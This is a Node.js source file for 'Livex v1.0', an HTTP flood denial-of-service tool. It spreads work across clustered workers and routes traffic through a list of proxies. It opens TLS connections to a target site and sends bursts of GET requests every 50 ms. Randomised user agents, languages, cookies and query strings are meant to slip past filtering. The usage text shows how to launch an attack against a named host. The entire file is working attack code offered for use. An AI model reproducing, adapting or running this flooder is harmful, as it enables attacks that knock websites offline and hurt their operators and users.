process.on('uncaughtException', function (er) {
    console.error(er)
});
process.on('unhandledRejection', function (er) {
    console.error(er)
});

require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');
var path = require("path");
const cluster = require('cluster');
const crypto = require('crypto');
const tls = require('tls');
const http = require('http');
const colors = require('colors');
const argv = require('minimist')(process.argv.slice(2));
const os = require('os');


const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-ECDSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES256-CBC-SHA`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this.sigalgss = sigalgs;

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: this.sigalgss,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};
const secureContext = tls.createSecureContext(secureContextOptions);


function ra(length) {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": length
    });
    return rsdat;
}

function generateCookie() {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": 6
    });

    let cookie = `${rsdat}=${rsdat}; ${rsdat}=${rsdat};`;

    return cookie;
}

function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}

let cookies;

var file = path.basename(__filename);

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
}

if (process.argv.length == 2) {
    log(`(` + `Its a Livex`.cyan + `)` + ` ` + `Livex v1.0`);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Usage:` + ` ` + `node ${file} <host> <time> <threads> <rps> <proxies>`.blue);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --debug=<true>`.blue + ` - ` + `Prints debug information ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --cookies=<true>`.blue + ` - ` + ` Generates a random Cookies ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --querystring=<true>`.blue + ` - ` + `Generates a random Query String ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --delay=<delay in ms>`.blue + ` - ` + `Delay before a new flood ` + `(def: 0 [ms])`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --interval=<true>`.blue + ` - ` + `More R/S, but some protections can filter ` + `(def: true)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Example:` + ` ` + `node ${file} https://shitflare.asia 60 10 64 proxy.txt --debug=true --ua=windows --querystring=true`.blue);
    process.exit(1);
}

if (process.argv.length < 6) {
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Incorrect usage!`);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Usage:` + ` ` + `node ${file} <host> <time> <threads> <rps> <proxies>`.blue);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --debug=<true>`.blue + ` - ` + `Prints debug information ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --cookies=<true>`.blue + ` - ` + ` Generates a random Cookies ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --querystring=<true>`.blue + ` - ` + `Generates a random Query String ` + `(def: disable)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --delay=<delay in ms>`.blue + ` - ` + `Delay before a new flood ` + `(def: 0 [ms])`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + ` --interval=<true>`.blue + ` - ` + `More R/S, but some protections can filter ` + `(def: true)`.gray);
    log(`(` + `Livex Info`.blue + `)` + ` ` + `Example:` + ` ` + `node ${file} https://shitflare.asia 60 10 64 proxy.txt --debug=true --ua=windows --querystring=true`.blue);
    process.exit(1);
}

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[4];
const rateT = process.argv[5];
const proxyT = process.argv[6];

const debug = argv["debug"] || 'false';
const cookiesT = argv["cookies"] || 'false';
const querystringT = argv["querystring"] || 'false';
const delay = argv["delay"] || 0;
const intervalAttack = argv["interval"] || 'true';

if (cluster.isMaster) {
    for (let i = 0; i < threadsT; i++) {
        cluster.fork();
    }

    console.clear()
    log(`(` + `Proxy`.magenta + `)` + ` ` + `Loaded` + ` ` + `${fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n').length}`.brightMagenta + ` proxies.`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + `Attack Successfully started!`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + `Target: ` + `${process.argv[2]}`.brightBlue + ` | Duration: ` + `${process.argv[3]} sec.`.brightBlue + ` | Threads: ` + `${process.argv[4]}`.brightBlue + ` | RPS: ` + `${process.argv[5]}`.brightBlue);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + ` --debug: `.brightBlue + `${debug}`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + ` --cookies: `.brightBlue + `${cookiesT}`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + ` --querystring: `.brightBlue + `${querystringT}`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + ` --delay: `.brightBlue + `${delay}`);
    log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + ` --interval: `.brightBlue + `${intervalAttack}`);

    setTimeout(() => {
        log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + `Attack is over.`);
        process.exit();
    }, timeT * 1000);
} else {
    setInterval(() => { startflood() }, delay)
}

var proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n');
const target = urlT.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);



function startflood() {
    const uaversion = ['100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113'];
    const win = ['Win64; x64', 'Win32; x32'];
    const fetch = ['none', 'same-origin'];
    const lang = ['ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-CA', 'en-NZ', 'en-ZA', 'en-IN', 'en-PH', 'en-SG', 'en-ZA', 'en-HK', 'en-US', '*', 'en-US,en;q=0.5', 'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5'];
    const random_1 = uaversion[Math.floor(Math.random() * uaversion.length)];
    const random_2 = win[Math.floor(Math.random() * win.length)];
    const random_3 = fetch[Math.floor(Math.random() * fetch.length)];
    const random_4 = lang[Math.floor(Math.random() * lang.length)];
    let querystring = parsed.path.replace("%RAND%", ra(4));


    if (cookiesT == 'true') {
        cookies = generateCookie();
    }


    if (querystringT == 'true') {
        querystring = parsed.path + "?" + ra(4) + "=" + ra(4);
    }

    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    if (debug == 'true') {
        log(`(` + `Flooder`.brightYellow + `)` + ` ` + `Attacking from ` + `${proxy[0]}:${proxy[1]}`.brightYellow + ` ` + `proxy.`);
    }

    const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
        maxTotalSockets: Infinity,
        maxSockets: Infinity
    });

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        method: 'CONNECT',
        ciphers: ciphers,
        sigalgs: this.sigalgss,
        ecdhCurve: this.ecdhCurve,
        agent: agent,
        globalAgent: agent,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        path: parsed.host + ":443"
    }, function () {
        req.setSocketKeepAlive(true);
    }).on('error', () => { });

    req.on('connect', function (res, socket, head) {
        const tlsConnection = tls.connect({
            rejectUnauthorized: false,
            host: parsed.host + ":443",
            servername: parsed.host,
            secureOptions: secureOptions,
            //minVersion: 'TLSv1.2',
            ciphers: ciphers,
            sigalgs: this.sigalgss,
            ecdhCurve: this.ecdhCurve,
            honorCipherOrder: false,
            requestCert: true,
            socket: socket,
            secure: true,
            //ALPNProtocols: ['h2', 'http/1.1'],
            secureProtocol: "TLS_client_method",
            secureContext: secureContext,
            gzip: true,
            allowHTTP1: true,
            isServer: false,
        }, function () {
            tlsConnection.setKeepAlive(true, 10 * 1000);
            setInterval(() => {
                for (let i = 0; i < rateT; i++) {
                    tlsConnection.write(
                        "GET " + `${parsed.path}` + " HTTP/1.1\r\n" +
                        "Host: " + parsed.host + "\r\n" +
                        "Referer: " + target + "\r\n" +
                        "Origin: " + target + "\r\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n" +
                        "user-agent: " + `Mozilla/5.0 (Windows NT 10.0; ` + random_2 + `) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/` + random_1 + `.0.0.0 Safari/537.36` + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        "Accept-Encoding: gzip, deflate, br\r\n" +
                        "Accept-Language: " + random_4 + "\r\n" +
                        "Cookie: " + cookies + "\r\n" +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n\r\n"
                    );
                }
            }, 50)
        });

        tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
        });

        tlsConnection.on('data', function (data) { });
    });
    req.end();
}